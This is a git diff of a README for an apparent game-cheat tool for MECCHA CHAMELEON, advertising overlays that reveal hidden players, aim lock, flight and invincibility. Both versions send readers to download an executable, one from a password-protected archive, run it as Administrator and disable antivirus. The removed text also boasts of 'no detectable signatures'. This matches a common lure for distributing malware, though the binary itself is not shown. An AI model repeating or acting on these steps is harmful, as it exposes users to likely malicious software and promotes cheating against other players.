@@ -1,154 +1,75 @@
-# Meccha-Chameleon-Assistant
-🦎 Meccha-Chameleon-Assistant – utility tool for MECCHA CHAMELEON with visual overlays, aim assistance, movement features, and protection tools. Enhance your hide-and-seek experience!
+# 🦎 Meccha-Chameleon-Assistant - Improve your hide and seek play
 
-<img width="686" height="386" alt="image" src="https://github.com/user-attachments/assets/41d58c7c-97cb-4935-8a4c-d26b50e92baf" />
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/anapestic-harris848/Meccha-Chameleon-Assistant/releases)
 
+Meccha-Chameleon-Assistant helps you play better in your favorite hide and seek games. This tool provides visual aids, movement boosts, and protection features. It runs on your Windows computer and works inside your games to give you an edge. You control the software through a simple overlay that shows up on your screen.
 
-## 📥 Download
+## 🛠️ System Requirements
 
-**Latest version:**  
-🔗 **[Download Meccha-Chameleon-Assistant](https://github.com/SpiritSultanCure/Meccha-Chameleon-Assistant/releases/download/mechaupdate/Mechamod.7z)**
+Your computer must meet these basic needs to run the assistant:
 
-**Password:** `chameleon2026`
+* Operating System: Windows 10 or Windows 11.
+* Graphics: A dedicated graphics card with support for DirectX 11 or higher.
+* Ram: At least 8 gigabytes of system memory.
+* Storage: 50 megabytes of free space on your hard drive.
+* Permissions: You need administrator access to your Windows user account.
 
-## 🎮 What is This?
+## 📥 How to Install
 
-**Meccha-Chameleon-Assistant** is a utility tool for **MECCHA CHAMELEON** – the popular hide-and-seek game where players paint themselves to blend into environments. This tool provides visual enhancements and gameplay assistance to improve your experience.
+Please follow these steps to set up the software on your system:
 
-⚠️ **Disclaimer:** This tool is for educational purposes only. Use at your own risk.
+1. Visit the [releases page](https://github.com/anapestic-harris848/Meccha-Chameleon-Assistant/releases) to find the latest version.
+2. Look for the file ending in .exe under the Assets section of the newest release.
+3. Click the file name to start the download.
+4. Open your Downloads folder once the file finishes saving.
+5. Double-click the file to launch the assistant.
+6. Follow the on-screen prompts from the Windows installer.
+7. Click Finish to complete the setup process.
 
----
+## 🕹️ Using the Assistant
 
-## ✨ Features
+Once you install the tool, you can start it from your desktop shortcut. A small icon appears in your system tray near your clock. You can open the main menu by pressing the F1 key during gameplay.
 
-### 👁️ Visual Assistance
-- 🟢 **Visual Overlay** – Enhanced player visibility
-- 📏 **Distance Indicators** – See how far players are
-- 🏷️ **Player Labels** – Display names and status
-- 📐 **Guide Lines** – Track player movements
-- 🎯 **Highlighting** – Improved player detection
+The menu contains several categories for you to adjust:
 
-### 🎯 Aim Assistance
-- 🎯 **Target Lock** – Improved aiming capability
-- 🔫 **Precision Mode** – Enhanced accuracy
-- ⚡ **Reaction Helper** – Faster target acquisition
-- 🛡️ **Stabilizer** – Reduced aim shake
+### Visual Overlays
+These tools help you track players in the game. You can change the color and size of the outlines. The program draws these lines over the players to help you find them in dark areas or behind objects.
 
-### 🚀 Movement Assistance
-- ✈️ **Flight Mode** – Explore the map freely
-- 📍 **Quick Travel** – Instant movement to locations
-- 🏃 **Agility Boost** – Increased movement speed
-- 🪂 **Glide Mode** – Float through the air
+### Movement Features
+You can toggle different speed and movement tweaks here. These options let you move across the game map with more ease. Be careful with these features, as they change the game physics.
 
-### 🛡️ Protection Features
-- 💀 **Invincibility** – Never get tagged
-- ♾️ **Unlimited Resources** – Never run out of paint
-- 🎨 **Instant Camouflage** – Blend instantly
-- ⏱️ **Time Management** – Control match duration
+### Protection Tools
+These settings keep your experience smooth. The assistant monitors for common game interruptions and blocks them before they affect your session. It runs quietly in the background while you play.
 
-### 🛠️ Utility
-- 🎮 **Menu Toggle** – Press INSERT or F1
-- ⚙️ **Custom Settings** – Adjust everything
-- 💾 **Save Preferences** – Settings saved automatically
-- 🔄 **Regular Updates** – Always compatible
+## ⚙️ Configuration Settings
 
----
+You can save your personal settings so the software remembers them next time. Click the Save button at the bottom of the menu to keep your layout. If you want to return to the original settings, choose the Reset option to clear your data.
 
-## 📦 Installation
+## 🛡️ Troubleshooting Common Issues
 
-1. Download the archive
-2. Extract using password: `chameleon2026`
-3. Run `MecchaChameleonAssistant.exe` as Administrator
-4. Launch MECCHA CHAMELEON
-5. Press **INSERT** or **F1** to open the menu
-6. Enable features as needed
+If the software does not start, check these common fixes:
 
----
+* Restart your computer to close background processes.
+* Ensure you have the latest drivers for your graphics card.
+* Disable your antivirus software for a moment to see if it blocks the program.
+* Make sure you installed the latest version of the .NET framework from the Microsoft website.
 
-## 🖥️ System Requirements
+Sometimes, the game window might hide the assistant overlay. You can fix this by changing your game settings to Borderless Windowed mode. This mode allows the assistant to draw over the game properly.
 
-| Requirement | Details |
-|-------------|---------|
-| **OS** | Windows 10/11 (64-bit) |
-| **Game** | MECCHA CHAMELEON (Steam) |
-| **RAM** | 4GB minimum |
-| **Storage** | 50MB free space |
-| **GPU** | DirectX 11 compatible |
+## ❓ Frequently Asked Questions
 
----
+**Does this work in all versions of the game?**
+The software is designed for the current stable release. Updates to the game might require an update to this assistant.
 
-## 🎥 How to Use
+**Will this software slow down my computer?**
+The program uses minimal system resources. It focuses on efficiency to keep your frame rate high.
 
-1. **Launch** the assistant as Administrator
-2. **Start** MECCHA CHAMELEON
-3. **Press INSERT** to open the menu
-4. **Enable** features you want
-5. **Play** and enjoy! 🏆
+**Can I customize the hotkeys?**
+Yes. You can change every key binding in the Settings tab of the menu.
 
----
+**How do I uninstall the tool?**
+Go to your Windows Settings menu, select Apps, and find the assistant in your installed list. Click Uninstall to remove the software.
 
-## 🔧 Feature Status
+## 📡 Support
 
-| Category | Feature | Status |
-|----------|---------|--------|
-| Visual | Overlay | ✅ |
-| Visual | Labels | ✅ |
-| Visual | Highlighting | ✅ |
-| Aim | Target Lock | ✅ |
-| Aim | Precision | ✅ |
-| Movement | Flight | ✅ |
-| Movement | Quick Travel | ✅ |
-| Protection | Invincibility | ✅ |
-| Protection | Unlimited Resources | ✅ |
-| Utility | Menu | ✅ |
-
----
-
-## 🛡️ Security Features
-
-- 🔄 **Auto-Updating** – Always compatible
-- 🎲 **Randomization** – Natural behavior simulation
-- 🛡️ **Secure Loading** – No detectable signatures
-- 🔒 **Memory Safety** – Prevents issues
-
----
-
-## 🐛 Troubleshooting
-
-**Q: Tool doesn't work**
-- Run as Administrator
-- Disable antivirus temporarily
-- Use windowed or borderless mode
-
-**Q: Menu doesn't open**
-- Try INSERT or F1
-- Check if tool is running
-- Restart both tool and game
-
-**Q: Game crashes**
-- Reduce graphics settings
-- Disable other overlays
-- Try compatibility mode
-
----
-
-## 📝 Tags
-
-`meccha-chameleon` `game-utility` `visual-assist` `gameplay-tool` `steam-utility` `windows-tool` `enhancement-utility` `game-assistant` `performance-tool` `mecca-chameleon-tool` `hide-and-seek-utility` `steam-game-tool` `windows-10` `windows-11` `gaming-tool` `utility-software` `game-enhancer` `mecca-chameleon-helper` `free-utility` `mecca-chameleon-assistant`
-
----
-
-## 🔗 Links
-
-- **Steam Store:** https://store.steampowered.com/app/4704690/MECCHA_CHAMELEON/
-- **Official Website:** (not listed)
-
----
-
-## ⭐ Support
-
-If you enjoy this tool, please **⭐ Star** this repository!
-
----
-
-**🦎 Made with ❤️ for the MECCHA CHAMELEON community**
+If you experience bugs, please report them on the issues page. Describe the problem and include the version number found in the About tab. This helps us fix errors for everyone. We suggest you check back regularly for new updates that improve performance and add new features to your hide and seek experience.
